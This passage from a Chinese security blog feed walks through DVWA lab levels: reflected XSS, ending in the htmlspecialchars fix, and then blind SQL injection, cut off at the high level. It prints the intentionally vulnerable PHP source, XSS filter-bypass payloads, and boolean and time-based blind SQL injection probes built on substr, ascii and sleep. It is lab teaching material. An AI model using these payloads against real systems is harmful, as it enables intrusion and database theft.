class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>low级别的源码没有对 <code>name</code>任何过滤，仅仅判断是否为空。</p><ol><li>直接输入 <code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code></li></ol><h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>medium对 <code>name</code>进行了字符串过滤。是否包含 <code>&lt;script&gt;</code>字符串，包含则替换为空。</p><ul><li>双写绕过。<code>&lt;s&lt;script&gt;cript&gt;alert(&quot;xss&quot;)&lt;/s&lt;script&gt;cript&gt;</code></li><li>大写绕过，html大小写不敏感。<code>&lt;Script&gt;alert(&quot;XSS&quot;)&lt;/Script&gt;</code></li></ul><h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>high级别使用了正则匹配，过滤了大小写以及双写情况。</p><ul><li>使用其他HTML标签。比如 <code>&lt;img&gt;</code>,<code>&lt;iframe&gt;</code><ul><li><code>&lt;img src = &quot;&quot; onerror = alert(&quot;XSS&quot;)&gt;</code></li></ul></li></ul><h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><p>开启全反击！学习时间到！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>htmlspecialchars() 函数用于把预定义的字符 “&lt;” 和 “&gt;” 转换为 HTML 实体，相当于把输入全部当成数据，防止了我们注入 HTML 标签。例如我们注入 “”，htmlspecialchars 函数会将 &lt; 和 &gt; 转换成 html 实体而不是当做标签，所以我们插入的语句并不会被执行。同时加入 Anti-CSRF token 防护 CSRF 攻击，进一步提高安全性。</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">htmlspecialchars(<span class="hljs-variable">_string_</span>,<span class="hljs-variable">_flags_</span>,<span class="hljs-variable">_character</span>-set_,<span class="hljs-variable">_double</span>\<span class="hljs-variable">_encode_</span>)<br></code></pre></td></tr></table></figure><p>htmlspecialchars()预定义的字符是：</p><ul><li>&amp; （和号）成为 &amp;</li><li>“ （双引号）成为 “</li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 &lt;</li><li>&gt; （大于）成为 &gt;</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>XSS的危害比较广泛。比如盗取cookie,网页挂马，结合其他漏洞等等。但是反射型的XSS只是对本次请求进行了恶意行为，可以通过对输入过滤、编码增强安全性。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS-反射型</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL-injection-blind</title>
    <link href="/2022/06/05/dvwa-SQL-injection-blind/"/>
    <url>/2022/06/05/dvwa-SQL-injection-blind/</url>
    
    <content type="html"><![CDATA[<blockquote><p>当攻击者执行 SQL 注入攻击时，服务器有时会响应来自数据库服务器的错误消息，报告 SQL 查询的语法不正确。SQL 盲注入与普通 SQL 注入相同，只是当攻击者试图利用应用程序进行攻击时，得到的不是有用的报错信息，而是开发人员指定的通用页面。这使得利用 SQL 注入攻击变得更加困难，但这并非是不可能的。攻击者仍然可以通过 SQL 语句询问一系列真假问题，并监视 web 应用程序的响应来窃取数据。</p></blockquote><blockquote><ol><li>布尔盲注：顾名思义就是基于布尔运算特性的盲注，布尔盲注语句需要在涉及判断的功能才能使用，其中最常见的就是在查询条件的位置，分别拼接上一段结果为真和结果为假的判断语句，如果结果为真时显示效果与原来一致，结果为假时查询不到数据或与原来数据不一直，则认为存在布尔盲注。</li></ol></blockquote><blockquote><ol start="2"><li>时间盲注：同样也就是基于时间运算特性的盲注，时间盲注主要是对没有涉及判断的功能，如插入、更新等语句的数据为止（而非条件语句的位置），或者布尔盲注没有结果的类型（如显示均为正常或均为异常），可以尝试使用延迟注入进行测试，如果插入时间型盲注语句后服务器延迟响应，则可以认为存在SQL注入漏洞。</li></ol></blockquote><h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><h2 id="请求页面"><a href="#请求页面" class="headerlink" title="请求页面"></a>请求页面</h2><p><img src="/2022/06/05/dvwa-SQL-injection-blind/1692261151176.png" alt="1692261151176"></p><h2 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h2><p>输入 <code>1</code>，先看看情况</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:4280<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:4280/vulnerabilities/sqli_blind/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=56b6259296256464a178e043c6597894; security=low<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br></code></pre></td></tr></table></figure><h2 id="响应页面"><a href="#响应页面" class="headerlink" title="响应页面"></a>响应页面</h2><p><img src="/2022/06/05/dvwa-SQL-injection-blind/1692261278132.png" alt="1692261278132"></p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;<span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br><br>    <span class="hljs-comment">// Check database</span><br>    <span class="hljs-variable">$getid</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$getid</span> ); <span class="hljs-comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span><br><br>    <span class="hljs-comment">// Get results</span><br>    <span class="hljs-variable">$num</span> = @<span class="hljs-title function_ invoke__">mysqli_num_rows</span>( <span class="hljs-variable">$result</span> ); <span class="hljs-comment">// The &#x27;@&#x27; character suppresses errors</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$num</span> &gt; <span class="hljs-number">0</span> ) &#123;<br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span><br>        <span class="hljs-title function_ invoke__">header</span>( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="hljs-string">&#x27; 404 Not Found&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><ol><li><p>布尔盲注<br>通过分析源码，可以知道一些重要的信息，比如说这是数值型注入并且页面会有2种显。二分法分万物哈哈哈哈哈。</p><ol><li><p>判断注入类型，结果数值型</p><ul><li>输入 <code>1</code>，返回 <code>User ID exists in the database.</code></li><li>输入 <code>1‘</code>，返回 <code>User ID is MISSING from the database.</code></li></ul></li><li><p>判断回显。只有以上两种回显。</p></li><li><p>获取其他信息。运用布尔盲注或者时间盲注，这里使用布尔盲注比较快捷</p><ul><li><p>获取数据库版本号。最后测试出版本为 <code>10.1.26</code></p><ul><li>判断版本号第1位是否为1,<code>1&#39; and substr(version(),1,1) = &#39;1&#39; #</code></li><li>判断版本号第2位是否为0,<code>1&#39; and substr(version(),2,1) = &#39;0&#39; #</code></li><li>以此类推</li></ul></li><li><p>获取数据路名称。也可以用ASCII码来辅助判断，最后测试出名称为 <code>dvwa</code></p><table><thead><tr><th>字符</th><th>ASCII(十进制)</th></tr></thead><tbody><tr><td>a</td><td>97</td></tr><tr><td>A</td><td>65</td></tr><tr><td>0</td><td>48</td></tr><tr><td>_</td><td>95</td></tr><tr><td>z</td><td>122</td></tr><tr><td>Z</td><td>90</td></tr><tr><td>9</td><td>57</td></tr><tr><td>@</td><td>64</td></tr></tbody></table></li></ul></li></ol></li></ol><pre><code class="hljs">    - 判断数据库名第1位是d,`1&#39;and ascii(substr(database(),1,1))=100 #`</code></pre><ol start="2"><li>时间盲注(顺序类似布尔盲注)<ul><li>判断数据库版本第1位是1,。<code>1&#39; and if(substr(version(),1,1) = &#39;1&#39; , sleep(3), 1) #</code></li></ul></li></ol><h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><h2 id="请求页面-1"><a href="#请求页面-1" class="headerlink" title="请求页面"></a>请求页面</h2><p>请求页面变成了下拉选择框，限制用户输入<br><img src="/2022/06/05/dvwa-SQL-injection-blind/1692283885330.png" alt="1692283885330"></p><h2 id="http请求-1"><a href="#http请求-1" class="headerlink" title="http请求"></a>http请求</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/vulnerabilities/sqli_blind/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>18<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/vulnerabilities/sqli_blind/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=56b6259296256464a178e043c6597894; security=medium<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-ini"><span class="hljs-attr">id</span>=<span class="hljs-number">1</span>&amp;Submit=Submit</span><br></code></pre></td></tr></table></figure><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><p>源码如下，源码使用了 mysql_real_escape_string() 函数转义字符串中的特殊字符。也就是说特殊符号 \x00、\n、\r、\、’、” 和 \x1a 都将进行转义。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br>    <span class="hljs-variable">$id</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$id</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Check database</span><br>    <span class="hljs-variable">$getid</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="hljs-subst">$id</span>;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$getid</span> ); <span class="hljs-comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span><br><br>    <span class="hljs-comment">// Get results</span><br>    <span class="hljs-variable">$num</span> = @<span class="hljs-title function_ invoke__">mysqli_num_rows</span>( <span class="hljs-variable">$result</span> ); <span class="hljs-comment">// The &#x27;@&#x27; character suppresses errors</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$num</span> &gt; <span class="hljs-number">0</span> ) &#123;<br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h2><ol><li>布尔盲注<br>值得一提的是，单引号在中级别的代码中被过滤了，不过我们可以使用 ASCII 码的值来代替原来单引号括起来的字符。MySql 的 ASCII() 函数把字符转换成 ascii 码值，然后我们同样把版本号的各个字符提取出来，然后和 0 ~ 9 和 “.” 11 个字符的 ascii 码值作比较。<ul><li>获取数据库版本号<ul><li>判断第1位是不是1,<code>1 and ascii(substr(version(),1,1)) = 49 #</code></li></ul></li><li>获取数据库名<ul><li>判断数据库名第1位是d,<code>1 and ascii(substr(database(),1,1))=100 #</code></li></ul></li></ul></li><li>时间盲注(过程类似布尔盲注)<ul><li>获取数据库版本号<ul><li>判断第1位是不是1,<code>1 and if(ascii(substr(version(),1,1)) = 49,sleep(3),1) #</code></li></ul></li></ul></li></ol><h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><p>源码如下，High 级别的只是在 SQL 查询语句中添加了 LIMIT 1，这令服务器仅回显查询到的一个结果。同时源码利用了 cookie 传递参数 id，当 SQL 查询结果为空时会执行函数 sleep()，这是为了混淆基于时间的盲注的响应时间判断。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_COOKIE</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_COOKIE</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br><br>    <span class="hljs-comment">// Check database</span><br>    <span class="hljs-variable">$getid</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 1;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$getid</span> ); <span class="hljs-comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span><br><br>    <span class="hljs-comment">// Get results</span><br>    <span class="hljs-variable">$num</span> = @<span class="hljs-title function_ invoke__">mysqli_num_rows</span>( <span class="hljs-variable">$result</span> ); <span class="hljs-comment">// The &#x27;@&#x27; character suppresses errors</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$num</span> &gt; <span class="hljs-number">0</span> ) &#123;<br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Might sleep a random amount</span><br>        <span 